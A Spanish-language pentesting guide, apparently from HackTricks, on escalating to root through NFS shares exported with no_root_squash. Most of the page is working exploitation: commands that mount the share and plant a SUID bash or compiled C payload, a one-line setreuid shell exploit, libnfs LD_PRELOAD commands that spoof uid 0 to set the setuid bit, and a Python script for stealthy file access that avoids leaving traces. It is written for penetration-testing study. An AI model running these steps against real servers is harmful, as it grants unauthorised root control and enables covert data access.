{{#include ../../banners/hacktricks-training.md}}

# Información Básica sobre Squashing

NFS generalmente (especialmente en Linux) confía en el `uid` y `gid` indicados por el cliente que se conecta para acceder a los archivos (si no se utiliza kerberos). Sin embargo, hay algunas configuraciones que se pueden establecer en el servidor para **cambiar este comportamiento**:

- **`all_squash`**: Aplana todos los accesos mapeando a cada usuario y grupo a **`nobody`** (65534 sin signo / -2 con signo). Por lo tanto, todos son `nobody` y no se utilizan usuarios.
- **`root_squash`/`no_all_squash`**: Este es el valor predeterminado en Linux y **solo aplana el acceso con uid 0 (root)**. Por lo tanto, cualquier `UID` y `GID` son confiables, pero `0` se aplana a `nobody` (por lo que no es posible la suplantación de root).
- **`no_root_squash`**: Esta configuración, si está habilitada, ni siquiera aplana al usuario root. Esto significa que si montas un directorio con esta configuración, puedes acceder a él como root.

En el archivo **/etc/exports**, si encuentras algún directorio que esté configurado como **no_root_squash**, entonces puedes **acceder** a él desde **como cliente** y **escribir dentro** de ese directorio **como** si fueras el **root** local de la máquina.

Para más información sobre **NFS**, consulta:

{{#ref}}
/network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Escalación de Privilegios

## Explotación Remota

Opción 1 usando bash:
- **Montar ese directorio** en una máquina cliente, y **como root copiar** dentro de la carpeta montada el binario **/bin/bash** y darle derechos **SUID**, y **ejecutar desde la máquina víctima** ese binario bash.
- Ten en cuenta que para ser root dentro del recurso compartido NFS, **`no_root_squash`** debe estar configurado en el servidor.
- Sin embargo, si no está habilitado, podrías escalar a otro usuario copiando el binario al recurso compartido NFS y dándole el permiso SUID como el usuario al que deseas escalar.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opción 2 usando código compilado en C:
- **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada nuestra carga útil compilada que abusará del permiso SUID, dándole derechos de **SUID**, y **ejecutando desde la máquina víctima** ese binario (puedes encontrar aquí algunos [C SUID payloads](payloads-to-execute.md#c)).
- Las mismas restricciones que antes.
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Tenga en cuenta que si puede crear un **túnel desde su máquina a la máquina víctima, aún puede usar la versión remota para explotar esta escalada de privilegios tunelizando los puertos requeridos**.\
> El siguiente truco es en caso de que el archivo `/etc/exports` **indique una IP**. En este caso **no podrá usar** en ningún caso la **explotación remota** y necesitará **abusar de este truco**.\
> Otro requisito necesario para que la explotación funcione es que **la exportación dentro de `/etc/export`** **debe estar usando la bandera `insecure`**.\
> --_No estoy seguro de que si `/etc/export` está indicando una dirección IP, este truco funcionará_--

## Basic Information

El escenario implica explotar un recurso compartido NFS montado en una máquina local, aprovechando un defecto en la especificación de NFSv3 que permite al cliente especificar su uid/gid, lo que potencialmente habilita el acceso no autorizado. La explotación implica usar [libnfs](https://github.com/sahlberg/libnfs), una biblioteca que permite la falsificación de llamadas RPC de NFS.

### Compiling the Library

Los pasos de compilación de la biblioteca pueden requerir ajustes según la versión del kernel. En este caso específico, las llamadas al sistema fallocate fueron comentadas. El proceso de compilación implica los siguientes comandos:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Realizando el Explotación

La explotación implica crear un programa simple en C (`pwn.c`) que eleva los privilegios a root y luego ejecuta un shell. El programa se compila y el binario resultante (`a.out`) se coloca en el recurso compartido con suid root, utilizando `ld_nfs.so` para falsificar el uid en las llamadas RPC:

1. **Compilar el código de explotación:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Coloca el exploit en el recurso compartido y modifica sus permisos falsificando el uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Ejecuta el exploit para obtener privilegios de root:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell para Acceso a Archivos Sigiloso

Una vez que se obtiene acceso root, para interactuar con el recurso compartido NFS sin cambiar la propiedad (para evitar dejar rastros), se utiliza un script de Python (nfsh.py). Este script ajusta el uid para que coincida con el del archivo que se está accediendo, lo que permite interactuar con archivos en el recurso compartido sin problemas de permisos:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Ejecutar como:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
